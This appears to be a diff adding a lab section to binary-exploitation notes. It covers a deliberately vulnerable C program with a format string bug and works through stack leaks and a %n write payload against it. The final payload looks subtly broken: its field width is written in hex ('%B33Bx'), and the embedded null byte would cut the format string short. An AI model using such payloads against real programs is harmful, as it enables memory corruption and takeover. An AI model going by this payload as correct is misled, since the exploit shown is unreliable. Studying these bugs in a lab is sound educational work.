@@ -391,4 +391,89 @@ int main(int argc, char **argv){
 3. Exploit
 
 
+
+## Binary 5
+
+```C
+#include <stdio.h>
+#include <string.h>
+
+#define BUF_SIZE 32
+
+int main(int argc, char **argv){
+	volatile int target = 0;
+	char buffer[BUF_SIZE];
+	fgets(buffer, BUF_SIZE, stdin);
+	printf(buffer);
+	if (target == 0xB33F){
+		printf("You win!\n");
+	}
+	return 0;
+}
+```
+
+
+### What is this called?
+
+
+### Format String Exploitation/Bug
+
+
+### References
+
+1. [Exploit DB](https://www.exploit-db.com/docs/28476.pdf)
+2. [Stanford](https://crypto.stanford.edu/cs155/papers/formatstring-1.2.pdf)
+3. [Code Arcana](http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html)
+4. [CG Security](http://www.cgsecurity.org/Articles/SecProg/Art4/)
+
+
+### Exploit Discovery
+
+```
+λ ./bin
+Input: %x|%x|%x
+Output: f72109f0|cbce4730|78257c78
+```
+
+
+### Popping the Stack
+
+```Bash
+echo -e 'AAAA|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x|%x' | ./bof
+
+echo -e 'AAAA|%10$x' | ./bof
+Output: AAAA|41414141
+```
+
+
+### Concept
+
+%n writes bytes to an address
+
+```Bash
+echo -e '<address>%<value - bytes written>x%<target>$n'	
+```
+
+### Exploit Development
+
+* Address: 0x20105c
+* Value: 0xB33F
+* Bytes Written: len(Addres)
+* Target: 10
+
+![target](target.png)
+
+
+### Exploit Development
+
+```Bash
+echo -e '<address>%<value - bytes written>x%<target>$n'	
+```
+
+```Bash
+echo -e '\x5c\x10\x20\x00%B33Bx%10$n'	
+```
+
+
+
 ## Questions
